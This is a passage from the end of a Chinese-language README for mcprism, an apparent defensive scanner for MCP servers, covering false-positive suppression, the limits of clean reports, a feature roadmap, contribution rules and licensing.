**某个发现在我的环境里是误报，怎么办？**
能修就修底层问题；否则可以在抑制清单里带理由和到期时间把它抑制掉。被抑制项仍然可见，到期后自动失效。见 [docs/POLICIES.md](docs/POLICIES.md)。

**报告干净就说明 server 安全吗？**
不是。mcprism 报告的是已知、可观测的风险，无法证明某个 server 一定安全，所以只运行你信任的 server。

## 路线图

- [ ] 随着 MCP 规范演进，增加规则、降低误报
- [x] MCP Registry 扫描
- [ ] 策略覆盖之外的用户自定义规则
- [x] pre-commit hook
- [x] GitHub Actions 集成和 SARIF 输出
- [ ] 编辑器集成（VS Code、JetBrains）
- [x] Scoop 包
- [x] Homebrew 公式
- [x] Nix 包
- [x] Rust `rmcp` MCP 工具的 SAST 支持
- [ ] 支持更多 SAST 语言（Java、C#）
- [ ] 跨文件、对象流转和 JavaScript 跨函数污点追踪
- [ ] 为实时探测提供内置沙箱封装

## 贡献

欢迎提 issue 和 PR。好的规则贡献应该是信号明确、结果确定、误报率低的检查：在 `internal/rules` 下添加，映射到 OWASP MCP 风险，并附上测试。代码结构见 [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md)。提 PR 前请跑 `go vet ./... && go test ./...`。

## 许可证

[MIT](LICENSE) © mcprism contributors。

mcprism 是防御工具。它报告风险，但不能证明某个 server 一定安全；报告干净也不代表可以信任一个你并不了解的 server。


